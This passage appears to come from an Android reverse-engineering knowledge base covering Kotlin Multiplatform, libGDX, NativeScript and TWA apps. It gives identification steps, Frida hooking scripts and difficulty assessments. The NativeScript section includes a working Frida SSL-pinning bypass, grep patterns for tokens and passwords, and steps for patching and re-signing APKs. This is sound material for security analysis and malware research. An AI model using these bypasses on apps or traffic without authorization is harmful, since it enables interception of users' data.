console.log(\"[KMP] fetchUserData called with: \" + userId);\n        var result = this.fetchUserData(userId);\n        console.log(\"[KMP] fetchUserData returned: \" + result);\n        return result;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#coroutine-aware-hooking","title":"Coroutine-Aware Hooking","text":"<p>KMP shared code uses Kotlin coroutines extensively. Suspend functions compile to methods with an extra <code>Continuation</code> parameter:</p> <pre><code>Java.perform(function() {\n    var ApiService = Java.use(\"com.example.shared.ApiService\");\n    ApiService.getProfile.overload(\"java.lang.String\", \"kotlin.coroutines.Continuation\").implementation = function(token, continuation) {\n        console.log(\"[KMP] getProfile called with token: \" + token);\n        return this.getProfile(token, continuation);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#enumerating-shared-module-classes","title":"Enumerating Shared Module Classes","text":"<p>To find classes originating from the shared KMP module, enumerate classes matching the shared module package:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"shared\") !== -1 || className.indexOf(\"common\") !== -1) {\n                console.log(\"[KMP Shared] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre> <p>KMP shared modules typically compile to a package like <code>com.example.shared.*</code> or <code>com.example.common.*</code>, though this is entirely developer-configurable.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#hooking-kotlinxserialization","title":"Hooking kotlinx.serialization","text":"<p>Intercept JSON deserialization to capture API responses:</p> <pre><code>Java.perform(function() {\n    var Json = Java.use(\"kotlinx.serialization.json.Json\");\n    var JsonKt = Java.use(\"kotlinx.serialization.json.internal.StreamingJsonDecoder\");\n\n    JsonKt.decodeSerializableValue.implementation = function(deserializer) {\n        var result = this.decodeSerializableValue(deserializer);\n        console.log(\"[KMP Serialization] Decoded: \" + result.toString());\n        return result;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#shared-code-patterns","title":"Shared Code Patterns","text":""},{"location":"reversing/frameworks/kotlin-multiplatform/#repository-pattern","title":"Repository Pattern","text":"<p>KMP projects frequently use a repository pattern where shared code defines repositories that abstract data sources:</p> <p>In decompiled output, look for classes ending in <code>Repository</code> or <code>DataSource</code> in the shared package. These contain the core business logic and API call definitions.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#multiplatform-settings-key-value-storage","title":"Multiplatform Settings / Key-Value Storage","text":"<p>KMP apps often use multiplatform-settings for key-value storage. On Android, this wraps <code>SharedPreferences</code>:</p> <pre><code>Java.perform(function() {\n    var SharedPrefs = Java.use(\"android.app.SharedPreferencesImpl\");\n    SharedPrefs.getString.implementation = function(key, defValue) {\n        var value = this.getString(key, defValue);\n        console.log(\"[KMP Settings] getString(\" + key + \") = \" + value);\n        return value;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#koin-dependency-injection","title":"Koin Dependency Injection","text":"<p>Koin is the dominant DI framework in KMP projects (Dagger/Hilt are Android-only). In decompiled output, look for <code>org.koin.core.*</code> classes and module definitions that reveal the app's dependency graph and service architecture.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Assessment Code format Standard DEX bytecode Identification Difficult -- no unique markers Decompilation Full -- standard jadx output String extraction Standard -- all strings in DEX string pool Control flow recovery Full -- standard Kotlin compiled code Hooking Standard Frida Java hooks Patching Standard smali patching workflow Obfuscation ceiling R8/ProGuard, DexGuard, same as any native Android app Overall difficulty Easy (once identified) <p>The irony of KMP from a reverse engineering perspective is that the identification step is the hardest part. Once you determine an app uses KMP, every standard Android analysis technique works without modification. There is no custom VM to understand, no bytecode format to decompile, and no bridge to intercept.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#references","title":"References","text":"<ul> <li>Kotlin Multiplatform Documentation</li> <li>Ktor Client Documentation</li> <li>kotlinx.serialization Guide</li> <li>Koin -- Kotlin Multiplatform DI</li> <li>multiplatform-settings -- russhwolf</li> <li>jadx -- Android DEX Decompiler</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>KMP Expect/Actual Mechanism</li> </ul>"},{"location":"reversing/frameworks/libgdx/","title":"libGDX","text":"<p>libGDX is an open-source Java game development framework that produces standard Android APKs with conventional DEX bytecode. Unlike engines with custom VMs or bytecode formats, libGDX game logic is written in Java (or Kotlin), compiled to standard DEX, and decompiles directly with jadx. The framework provides cross-platform abstractions for rendering (OpenGL ES), input, audio, and file I/O, but the compiled output is indistinguishable from a standard Android app at the bytecode level. A native library (<code>libgdx.so</code>) handles low-level OpenGL and audio operations.</p>"},{"location":"reversing/frameworks/libgdx/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/libgdx/#framework-structure","title":"Framework Structure","text":"Layer Implementation Game logic Java/Kotlin -- compiled to standard DEX Framework core <code>com.badlogic.gdx.*</code> classes in DEX Native backend <code>libgdx.so</code> -- JNI bridge for OpenGL ES, audio, native buffers Platform backend <code>com.badlogic.gdx.backends.android.*</code> -- Android lifecycle integration Extensions Optional: Box2D (<code>libgdx-box2d.so</code>), FreeType (<code>libgdx-freetype.so</code>), Bullet physics <p>libGDX follows a single-entry-point pattern. The developer implements <code>com.badlogic.gdx.ApplicationListener</code> (or extends <code>com.badlogic.gdx.Game</code>) and registers it with the Android launcher activity. All game logic flows through lifecycle callbacks:</p> Callback Purpose <code>create()</code> Initialization -- load assets, set up first screen <code>render()</code> Called every frame -- game loop (update + draw) <code>resize()</code> Window/surface size changed <code>pause()</code> App backgrounded <code>resume()</code> App foregrounded <code>dispose()</code> Cleanup -- release resources"},{"location":"reversing/frameworks/libgdx/#screen-management","title":"Screen Management","text":"<p>Most libGDX apps use the <code>Screen</code> interface (via the <code>Game</code> base class) to organize gameplay into discrete screens. The <code>Game</code> class delegates to <code>Screen</code> instances, each with <code>show()</code>, <code>render()</code>, <code>hide()</code>, and <code>dispose()</code> callbacks. Typical screen classes (<code>MainMenuScreen</code>, <code>GameScreen</code>, <code>SettingsScreen</code>) are the primary targets for understanding app flow.</p>"},{"location":"reversing/frameworks/libgdx/#identification","title":"Identification","text":"Indicator Location <code>libgdx.so</code> Core native library (definitive) <code>libgdx-box2d.so</code> Box2D physics extension <code>libgdx-freetype.so</code> FreeType font rendering extension <code>libgdx-bullet.so</code> Bullet 3D physics extension <code>com.badlogic.gdx.*</code> Framework classes in DEX <code>com.badlogic.gdx.backends.android.*</code> Android backend classes <code>com.badlogic.gdx.backends.android.AndroidApplication</code> Typical launcher activity superclass <code>assets/*.atlas</code> Texture atlas files <code>assets/*.tmx</code> / <code>assets/*.tmj</code> Tiled map files <code>assets/*.fnt</code> BitmapFont files <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(libgdx|com\\.badlogic|\\.atlas)\"\n</code></pre> <p>The launcher activity typically extends <code>AndroidApplication</code> and contains a call to <code>initialize()</code> with the main <code>ApplicationListener</code> instance -- this reveals the game's entry point class.</p>"},{"location":"reversing/frameworks/libgdx/#code-location-extraction","title":"Code Location &amp; Extraction","text":"<p>All game logic lives in standard DEX bytecode. There is no embedded interpreter, no custom bytecode, no script files to extract. The analysis workflow is identical to any standard Android app:</p> <pre><code>jadx -d output/ target.apk\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#finding-the-entry-point","title":"Finding the Entry Point","text":"<p>The Android launcher activity reveals the game's main class:</p> <pre><code>public class AndroidLauncher extends AndroidApplication {\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        AndroidApplicationConfiguration config = new AndroidApplicationConfiguration();\n        initialize(new MyGame(), config);\n    }\n}\n</code></pre> <p>The class passed to <code>initialize()</code> (here <code>MyGame</code>) is the <code>ApplicationListener</code> implementation containing the game's entry point. Trace from there.</p>"},{"location":"reversing/frameworks/libgdx/#class-organization-patterns","title":"Class Organization Patterns","text":"<p>libGDX projects typically organize into <code>*.screens</code> (screen implementations), <code>*.entities</code> (game entities), <code>*.systems</code> (ECS systems if using Ashley or Artemis), <code>*.assets</code> (resource loading), and <code>*.network</code> (networking/C2 communication). Look for these package patterns in jadx to orient analysis.</p>"},{"location":"reversing/frameworks/libgdx/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Decompile with <code>jadx -d output/ target.apk</code></li> <li>Find the launcher activity in <code>AndroidManifest.xml</code> (the activity with <code>MAIN</code>/<code>LAUNCHER</code> intent filter)</li> <li>Find the <code>ApplicationListener</code> -- the class passed to <code>initialize()</code> in the launcher</li> <li>Trace <code>create()</code> -- this initializes screens, loads assets, and sets the first screen</li> <li>Trace screen classes -- look for <code>setScreen()</code> calls to map the screen flow</li> <li>Examine <code>render()</code> methods -- contains game loop logic, update/draw cycles</li> </ol>"},{"location":"reversing/frameworks/libgdx/#identifying-network-communication","title":"Identifying Network Communication","text":"<p>libGDX provides <code>com.badlogic.gdx.Net</code> for HTTP requests and TCP/UDP sockets. Search decompiled output for <code>sendHttpRequest</code>, <code>HttpRequest</code>, <code>Net.HttpResponseListener</code>, <code>Socket</code>, and <code>ServerSocket</code> to locate all network communication. Many libGDX apps also use OkHttp or Retrofit directly rather than the framework's built-in networking.</p>"},{"location":"reversing/frameworks/libgdx/#asset-analysis","title":"Asset Analysis","text":"<p>libGDX games store assets in the APK's <code>assets/</code> directory in standard formats: texture atlases (<code>.atlas</code> + <code>.png</code>), Tiled maps (<code>.tmx</code> XML / <code>.tmj</code> JSON), BitmapFonts (<code>.fnt</code> + <code>.png</code>), skin files (<code>.json</code>), particle effects (<code>.p</code>), and standard audio formats. All are plaintext or standard binary -- no proprietary encryption.</p> <p>Texture atlas <code>.atlas</code> files are plaintext indexes mapping sprite names to coordinates within the companion <code>.png</code> sheet. Sprite names (e.g., <code>player_idle</code>, <code>enemy_walk</code>) reveal game entity types. TMX maps contain level layout, spawn points, and gameplay configuration in readable XML.</p>"},{"location":"reversing/frameworks/libgdx/#hooking","title":"Hooking","text":"<p>libGDX apps use standard Java -- all Frida hooks target DEX-level Java methods:</p>"},{"location":"reversing/frameworks/libgdx/#intercept-screen-transitions","title":"Intercept Screen Transitions","text":"<pre><code>Java.perform(function() {\n    var Game = Java.use(\"com.badlogic.gdx.Game\");\n\n    Game.setScreen.implementation = function(screen) {\n        console.log(\"[Screen] Switching to: \" + screen.getClass().getName());\n        this.setScreen(screen);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#intercept-network-requests","title":"Intercept Network Requests","text":"<pre><code>Java.perform(function() {\n    var Net = Java.use(\"com.badlogic.gdx.Net\");\n    var HttpRequest = Java.use(\"com.badlogic.gdx.Net$HttpRequest\");\n\n    HttpRequest.setUrl.implementation = function(url) {\n        console.log(\"[HTTP] URL: \" + url);\n        this.setUrl(url);\n    };\n\n    HttpRequest.setContent.implementation = function(content) {\n        console.log(\"[HTTP] Body: \" + content);\n        this.setContent(content);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#intercept-preferences-local-storage","title":"Intercept Preferences (Local Storage)","text":"<p>libGDX uses <code>Preferences</code> for persistent key-value storage (wraps Android <code>SharedPreferences</code>):</p> <pre><code>Java.perform(function() {\n    var AndroidPreferences = Java.use(\"com.badlogic.gdx.backends.android.AndroidPreferences\");\n\n    AndroidPreferences.putString.implementation = function(key, val) {\n        console.log(\"[Prefs] putString: \" + key + \" = \" + val);\n        return this.putString(key, val);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#intercept-file-io","title":"Intercept File I/O","text":"<pre><code>Java.perform(function() {\n    var AndroidFileHandle = Java.use(\"com.badlogic.gdx.backends.android.AndroidFileHandle\");\n\n    AndroidFileHandle.readString.overload().implementation = function() {\n        var content = this.readString();\n        console.log(\"[File] Read: \" + this.path() + \" (\" + content.length + \" chars)\");\n        return content;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#enumerate-game-classes","title":"Enumerate Game Classes","text":"<p>Discover all loaded classes in the game's namespace to identify hook targets:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"com.targetgame\") !== -1) {\n                console.log(\"[Class] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/libgdx/#obfuscation","title":"Obfuscation","text":""},{"location":"reversing/frameworks/libgdx/#r8-proguard","title":"R8 / ProGuard","text":"<p>libGDX release builds typically run through R8/ProGuard, which minifies class and method names. The framework classes (<code>com.badlogic.gdx.*</code>) are usually kept unobfuscated via ProGuard rules, but game-specific classes get mangled names. Trace from known entry points (<code>ApplicationListener.create()</code>, <code>setScreen()</code>) to reconstruct class purposes.</p>"},{"location":"reversing/frameworks/libgdx/#native-library","title":"Native Library","text":"<p>The <code>libgdx.so</code> native library handles OpenGL ES calls, audio mixing, and buffer management. It rarely contains game-specific logic -- game code stays in Java/DEX. Analyze with Ghidra only if investigating framework-level vulnerabilities.</p>"},{"location":"reversing/frameworks/libgdx/#malware-context","title":"Malware Context","text":"<p>libGDX is primarily used for legitimate game development. Its appearance in malware is uncommon but follows specific patterns:</p> Use Case Details Trojanized games Legitimate libGDX games repackaged with malicious payloads injected into the DEX Ad fraud Games with excessive or hidden ad loading, click injection via WebView overlays Data harvesting Games collecting device identifiers, contacts, or location beyond gameplay needs <p>libGDX malware is typically a legitimate game with malicious code added, rather than a purpose-built malicious application. The game serves as a vehicle for user engagement (retention) while background components perform the actual malicious activity. Analyze the non-game packages in the DEX (outside <code>com.badlogic.gdx.*</code> and the game's own namespace) for injected malicious classes.</p>"},{"location":"reversing/frameworks/libgdx/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Standard DEX (Java/Kotlin) Readability High -- standard Java decompilation, framework APIs are well-documented String extraction Trivial -- standard DEX strings Control flow recovery Full -- standard Java decompilation Patching Standard APK patching (smali editing or jadx export) Obfuscation ceiling R8/ProGuard on game classes; framework classes stay readable Overall difficulty Easy <p>libGDX apps are among the most straightforward to reverse engineer. The framework adds no abstraction barriers beyond standard Java -- no custom VM, no bytecode format, no asset encryption. The open-source framework code (GitHub) serves as a complete API reference. Analysis effort is equivalent to any standard Android Java application.</p>"},{"location":"reversing/frameworks/libgdx/#references","title":"References","text":"<ul> <li>libGDX -- Official Site</li> <li>libGDX -- GitHub</li> <li>libGDX Wiki</li> <li>jadx -- Dex to Java Decompiler</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>Ghidra -- NSA Reverse Engineering Framework</li> </ul>"},{"location":"reversing/frameworks/nativescript/","title":"NativeScript","text":"<p>NativeScript apps embed a JavaScript engine (V8 on Android) that has direct bindings to the full Android SDK -- no WebView, no bridge serialization. JavaScript calls translate to native API invocations through runtime-generated bindings, giving NativeScript apps near-native capability while keeping all business logic in JavaScript or TypeScript bundles. The framework is open-source under the Apache 2.0 license and maintained by OpenJS Foundation (formerly Telerik/Progress).</p>"},{"location":"reversing/frameworks/nativescript/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/nativescript/#runtime","title":"Runtime","text":"<p>NativeScript on Android embeds Google's V8 engine inside a custom runtime (<code>libNativeScript.so</code>). At startup, the runtime generates metadata that maps every Android SDK class, method, and field to a JavaScript-accessible prototype. This means JS code can call <code>android.content.Intent</code> or <code>javax.crypto.Cipher</code> directly without any plugin or bridge layer.</p> Component Role V8 Engine Executes JavaScript/TypeScript (compiled to JS) at runtime libNativeScript.so Native library hosting V8, metadata access, and the JS-to-Java binding layer Android Runtime Metadata Pre-generated mappings of the entire Android SDK, stored in <code>assets/metadata/</code> Webpack Bundle Application code bundled into <code>assets/app/bundle.js</code> (and related chunks)"},{"location":"reversing/frameworks/nativescript/#js-to-native-call-path","title":"JS-to-Native Call Path","text":"<p>When JavaScript invokes a native Android API, the call flows through:</p> <ol> <li>JS function call in V8 context</li> <li>V8 binding layer in <code>libNativeScript.so</code> resolves the call against metadata</li> <li>JNI call from native code into the Android Java/Kotlin layer</li> <li>Android framework executes the request and returns the result back through JNI to V8</li> </ol> <p>This direct binding model means there is no serialized bridge (unlike React Native's old architecture). Every Android API is available from JavaScript without writing native plugins.</p>"},{"location":"reversing/frameworks/nativescript/#build-bundle-process","title":"Build &amp; Bundle Process","text":"<p>NativeScript uses Webpack to bundle application code at build time:</p> <ol> <li>TypeScript compiles to JavaScript</li> <li>Webpack bundles all JS into <code>bundle.js</code> (and optionally <code>vendor.js</code> for framework code)</li> <li>The bundle, metadata, and <code>libNativeScript.so</code> are packaged into the APK</li> <li>At runtime, V8 loads and executes the bundle directly</li> </ol>"},{"location":"reversing/frameworks/nativescript/#identification","title":"Identification","text":"Indicator Location <code>libNativeScript.so</code> <code>lib/&lt;arch&gt;/libNativeScript.so</code> in the APK <code>assets/app/bundle.js</code> Webpack-bundled application JavaScript <code>assets/app/vendor.js</code> Framework and dependency code (when chunk splitting is enabled) <code>assets/app/runtime.js</code> Webpack runtime loader <code>assets/metadata/</code> Android SDK metadata tree used by the runtime <code>org.nativescript.*</code> Package prefix in DEX classes <code>com.tns.Runtime</code> Main NativeScript runtime class <code>com.tns.NativeScriptActivity</code> Default activity superclass <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -iE \"(libNativeScript|assets/app/bundle|com/tns|metadata)\"\n</code></pre> <p>Confirm by looking for the runtime entry point in the manifest:</p> <pre><code>aapt dump xmltree target.apk AndroidManifest.xml | grep -i \"nativescript\\|com.tns\"\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#code-location-extraction","title":"Code Location &amp; Extraction","text":"<p>All application logic lives in the <code>assets/app/</code> directory:</p> <pre><code>unzip target.apk \"assets/app/*\" -d extracted/\n</code></pre> <p>Key files after extraction:</p> File Contents <code>bundle.js</code> Application business logic, routes, API calls, auth flows <code>vendor.js</code> NativeScript framework code, third-party libraries <code>runtime.js</code> Webpack module loader <code>package.json</code> App metadata (name, version, main entry point) <code>assets/app/fonts/</code> Custom fonts bundled with the app <p>The JavaScript bundles are plaintext -- Webpack-minified but not compiled to bytecode. NativeScript does not use a custom bytecode format like Hermes. V8 compiles the JS at runtime from source.</p>"},{"location":"reversing/frameworks/nativescript/#analysis","title":"Analysis","text":""},{"location":"reversing/frameworks/nativescript/#bundle-beautification","title":"Bundle Beautification","text":"<p>Since the bundles are standard JavaScript, beautification gives near-readable output:</p> <pre><code>npx prettier --write extracted/assets/app/bundle.js\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#webpack-module-recovery","title":"Webpack Module Recovery","text":"<p>NativeScript apps use Webpack's module system. The bundle contains a module map where each module is a function keyed by a numeric or string ID. After beautification, search for the Webpack bootstrap:</p> <pre><code>grep -n \"__webpack_require__\" extracted/assets/app/bundle.js | head -20\n</code></pre> <p>Each module boundary starts with a function signature like <code>function(module, exports, __webpack_require__)</code> or the arrow-function equivalent. Identify modules of interest by searching for string literals:</p> <pre><code>grep -n \"api\\|http\\|login\\|token\\|secret\\|password\\|encrypt\" extracted/assets/app/bundle.js\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#metadata-analysis","title":"Metadata Analysis","text":"<p>The <code>assets/metadata/</code> directory contains a tree structure mirroring the Android SDK package hierarchy. This reveals which native APIs the app uses:</p> <pre><code>ls extracted/assets/metadata/\nfind extracted/assets/metadata/ -name \"*.bin\" | head -20\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#native-library-analysis","title":"Native Library Analysis","text":"<p>Load <code>libNativeScript.so</code> in Ghidra or IDA for deeper analysis of the V8 embedding layer:</p> <pre><code>unzip target.apk \"lib/arm64-v8a/libNativeScript.so\" -d extracted/\n</code></pre> <p>Look for exported symbols related to the binding layer:</p> <pre><code>readelf -Ws extracted/lib/arm64-v8a/libNativeScript.so | grep -i \"CallJava\\|GetJavaField\\|Runtime\"\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Unzip APK and confirm NativeScript (<code>libNativeScript.so</code>, <code>assets/app/bundle.js</code>)</li> <li>Extract <code>assets/app/</code> contents</li> <li>Beautify <code>bundle.js</code> and <code>vendor.js</code> with Prettier or js-beautify</li> <li>Search for API endpoints, hardcoded credentials, auth logic, crypto keys</li> <li>Map Webpack modules to understand application structure</li> <li>Hook at runtime with Frida for dynamic secrets (tokens, decrypted payloads)</li> <li>Patch bundle directly (edit JS, repackage APK) for behavior modification</li> </ol>"},{"location":"reversing/frameworks/nativescript/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/nativescript/#java-layer-hooks","title":"Java-Layer Hooks","text":"<p>Since NativeScript calls Android APIs through JNI, standard Java-layer Frida hooks work for intercepting any native Android functionality the app uses:</p> <pre><code>Java.perform(function() {\n    var HttpURL = Java.use(\"java.net.HttpURLConnection\");\n    HttpURL.setRequestProperty.implementation = function(key, value) {\n        console.log(\"[HTTP Header] \" + key + \": \" + value);\n        this.setRequestProperty(key, value);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#nativescript-runtime-hooks","title":"NativeScript Runtime Hooks","text":"<p>Hook the NativeScript runtime class to intercept framework-level operations:</p> <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"com.tns.Runtime\");\n\n    Runtime.runScript.overload(\"java.io.File\").implementation = function(file) {\n        console.log(\"[NS] runScript: \" + file.getAbsolutePath());\n        return this.runScript(file);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#v8-native-hooks","title":"V8 Native Hooks","text":"<p>Intercept V8 function calls at the native layer by hooking <code>libNativeScript.so</code>:</p> <pre><code>var nsModule = Process.findModuleByName(\"libNativeScript.so\");\nif (nsModule) {\n    nsModule.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"CallJavaMethod\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[V8-&gt;Java] \" + exp.name);\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#enumerating-loaded-modules","title":"Enumerating Loaded Modules","text":"<p>Discover which NativeScript and application classes are loaded:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"com.tns\") !== -1 || className.indexOf(\"org.nativescript\") !== -1) {\n                console.log(\"[NS Class] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#js-bundle-patching","title":"JS Bundle Patching","text":"<p>Because bundles are plaintext JavaScript, direct patching is the simplest modification approach:</p> <ol> <li>Extract <code>assets/app/bundle.js</code></li> <li>Beautify and locate the target function</li> <li>Edit the JavaScript directly</li> <li>Repackage the APK with the modified bundle</li> <li>Re-sign and install</li> </ol> <pre><code>npx prettier --write bundle.js\n</code></pre> <p>After editing:</p> <pre><code>cd extracted &amp;&amp; zip -r ../modified.apk . &amp;&amp; cd ..\napksigner sign --ks keystore.jks modified.apk\n</code></pre>"},{"location":"reversing/frameworks/nativescript/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>NativeScript apps that implement SSL pinning typically do so at the Java layer using standard Android HTTP clients (OkHttp, HttpsURLConnection) or through the <code>nativescript-https</code> plugin, which wraps OkHttp's <code>CertificatePinner</code>. Standard Android SSL bypass techniques apply directly.</p> <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(host, certs) {\n        console.log(\"[SSL] Bypassed pin for: \" + host);\n    };\n\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log(\"[SSL] Bypassed TrustManager for: \" + host);\n        return untrustedChain;\n    };\n});\n</code></pre> <p>Some apps use the <code>nativescript-ssl-pinning</code> plugin which performs certificate checks in JavaScript. For these, patch the pinning logic directly in <code>bundle.js</code> -- locate the certificate comparison function and force it to return a passing result.</p>"},{"location":"reversing/frameworks/nativescript/#obfuscation","title":"Obfuscation","text":""},{"location":"reversing/frameworks/nativescript/#webpack-minification-default","title":"Webpack Minification (Default)","text":"<p>All production NativeScript builds run through Webpack, which applies:</p> <ul> <li>Identifier mangling -- local variable and function names reduced to single characters</li> <li>Tree shaking -- unused code elimination</li> <li>Module concatenation -- inlined modules reduce function call overhead</li> </ul> <p>This is the baseline for every release build. The output is minified but structurally intact -- beautification recovers readable control flow.</p>"},{"location":"reversing/frameworks/nativescript/#javascript-obfuscators","title":"JavaScript Obfuscators","text":"<p>Developers can integrate JS obfuscation tools into the Webpack pipeline:</p> Tool Technique javascript-obfuscator Control flow flattening, string encoding, dead code injection Jscrambler Commercial -- self-defending code, domain locking, anti-tampering terser Advanced minification with mangling (default in Webpack 5) <p>Jscrambler is the most aggressive option and the hardest to reverse. It transforms code before Webpack bundling, embedding runtime integrity checks that crash the app if the bundle is modified.</p>"},{"location":"reversing/frameworks/nativescript/#proguard-r8","title":"ProGuard / R8","text":"<p>The Java/Kotlin shell code (NativeScript runtime, custom native modules) passes through R8/ProGuard during release builds. This affects class and method names in the DEX layer but has no impact on the JavaScript bundles.</p>"},{"location":"reversing/frameworks/nativescript/#practical-impact","title":"Practical Impact","text":"<p>Most NativeScript apps in the wild rely only on Webpack minification. The JS bundle is readable after beautification. Apps with Jscrambler or javascript-obfuscator are uncommon but require significantly more effort -- dynamic analysis with Frida becomes the primary approach.</p>"},{"location":"reversing/frameworks/nativescript/#analysis-tools","title":"Analysis Tools","text":"Tool Purpose jadx DEX decompilation for the Java shell and runtime classes Frida Runtime hooking at both Java and native layers Ghidra Native analysis of <code>libNativeScript.so</code> and V8 internals Prettier JavaScript beautification source-map Parse source maps if included (debug builds) webpack-bundle-analyzer Visualize module composition of the bundle"},{"location":"reversing/frameworks/nativescript/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Plaintext JavaScript (Webpack-minified) Readability High -- beautification yields readable code String extraction Trivial -- standard <code>grep</code>/<code>strings</code> on JS bundles Control flow recovery Full -- no bytecode compilation step Patching Easy -- edit JS directly, repackage APK Native API visibility High -- metadata tree reveals all Android API usage Obfuscation ceiling Jscrambler (rare), javascript-obfuscator (uncommon) Overall difficulty Easy <p>NativeScript apps are among the easiest cross-platform frameworks to reverse engineer. The JavaScript bundles are plaintext, the Android API metadata is fully enumerable, and standard Java-layer hooks intercept all native calls. The primary analysis target is always <code>assets/app/bundle.js</code>.</p>"},{"location":"reversing/frameworks/nativescript/#references","title":"References","text":"<ul> <li>NativeScript Android Runtime -- NativeScript</li> <li>NativeScript Documentation</li> <li>V8 JavaScript Engine</li> <li>NativeScript Webpack -- NativeScript</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>jadx -- Android DEX Decompiler</li> <li>Ghidra -- NSA Reverse Engineering Framework</li> </ul>"},{"location":"reversing/frameworks/pwa-twa/","title":"PWA / TWA (Progressive Web Apps / Trusted Web Activities)","text":"<p>Progressive Web Apps (PWAs) wrapped as Trusted Web Activities (TWAs) are web applications packaged inside a minimal Android APK shell. The APK contains almost no native code -- it exists solely to launch Chrome Custom Tabs pointed at a web origin. All application logic, UI, and data handling live on a remote web server, not inside the APK. This makes the reverse engineering target the web application itself rather than the Android package. TWAs use Android's Digital Asset Links protocol to verify that the APK publisher controls the target web domain.</p>"},{"location":"reversing/frameworks/pwa-twa/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/pwa-twa/#pwa-fundamentals","title":"PWA Fundamentals","text":"<p>A Progressive Web App is a web application that uses modern browser APIs to provide app-like capabilities:</p> Component Role Service Worker JavaScript proxy between the app and network -- handles caching, offline support, push notifications Web App Manifest JSON file (<code>manifest.json</code>) defining app name, icons, start URL, display mode HTTPS Origin All PWA features require a secure origin Application Shell Cached HTML/CSS/JS skeleton that loads instantly, then hydrates with dynamic content"},{"location":"reversing/frameworks/pwa-twa/#twa-wrapper","title":"TWA Wrapper","text":"<p>A Trusted Web Activity is an Android activity that launches a Chrome Custom Tab in full-screen mode (no browser chrome) to display a PWA. On launch, the APK's <code>LauncherActivity</code> delegates to Chrome Custom Tabs, which verifies the Digital Asset Links relationship between the APK and the target domain. If verification passes, Chrome renders the PWA full-screen with no browser UI. If verification fails, Chrome shows the URL bar as a fallback.</p>"},{"location":"reversing/frameworks/pwa-twa/#key-distinction-from-webview-apps","title":"Key Distinction from WebView Apps","text":"<p>TWAs are fundamentally different from WebView-based frameworks (Cordova, Capacitor, uni-app):</p> Aspect TWA WebView Framework Rendering engine System Chrome (always up to date) Embedded WebView (varies by OS version) Code location Remote server Bundled in APK (<code>assets/www/</code>) Offline capability Service Worker cache (optional) Full offline by default Native bridge None -- browser sandbox only JavaScript bridge to native APIs APK size Tiny (&lt; 1 MB typically) Larger (includes web assets + native plugins)"},{"location":"reversing/frameworks/pwa-twa/#identification","title":"Identification","text":"Indicator Location Very small APK size (&lt; 2 MB) Overall package <code>com.google.androidbrowserhelper</code> DEX classes -- Google's TWA support library <code>LauncherActivity</code> or <code>TWALauncherActivity</code> Main activity in manifest <code>androidx.browser.trusted.*</code> Trusted Web Activity classes <code>asset_statements</code> string resource Digital Asset Links declaration No <code>assets/www/</code> or bundled web code Absence of local web content <code>org.chromium.chrome.browser.browserservices</code> Chrome TWA service references <code>META-INF/services/</code> with Chrome entries Service provider configuration <p>Quick check:</p> <pre><code>unzip -l target.apk | wc -l\naapt dump xmltree target.apk AndroidManifest.xml | grep -iE \"(launcher|twa|browser|customtab)\"\n</code></pre> <p>A TWA APK typically has fewer than 100 files. Compare this to a Cordova app which may have 